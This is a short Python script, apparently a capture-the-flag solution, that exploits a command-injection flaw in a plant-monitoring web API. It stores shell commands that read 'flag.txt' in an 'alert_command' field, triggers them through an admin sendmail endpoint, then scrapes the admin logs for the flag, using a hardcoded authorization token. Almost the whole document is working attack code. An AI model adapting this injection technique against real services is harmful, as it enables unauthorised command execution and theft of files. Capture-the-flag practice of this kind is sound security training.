from pwn import *
import requests  # Make sure to import the requests module
import re

# Base URL and headers
url_base = 'http://challenge.ctf.games:31422'
headers = {
    'accept': 'application/json',
    'Authorization': 'dGVzdHVzZXIuMS4xNzYxMTYwNjEx',
    'Content-Type': 'application/json'
}

# First POST request to edit the plant
edit_data = {
    "description": "A beautiful sunflower.",
    "sunlight_level": 100,
    "watering_threshold": 100,
    "alert_command": "/usr/bin/cat flag.txt; /usr/sbin/sendmail -t; "
}
response = requests.post(f'{url_base}/api/plants/3/edit', headers=headers, json=edit_data)
print(f"Edit Plant Response: {response.status_code} - {response.text}")

# Second POST request to trigger the sendmail
sendmail_data = {
    "plant_id": 3
}
response = requests.post(f'{url_base}/api/admin/sendmail', headers=headers, json=sendmail_data)
print(f"Sendmail Response: {response.status_code} - {response.text}")

# GET request to retrieve the logs and grep for the flag
response = requests.get(f'{url_base}/api/admin/logs', headers=headers)

# Use regex to find the flag in the response
flag_pattern = r'flag{.*?}'
match = re.search(flag_pattern, response.text)

if match:
    print(f"Flag found: {match.group(0)}")
else:
    print("Flag not found in the logs.")
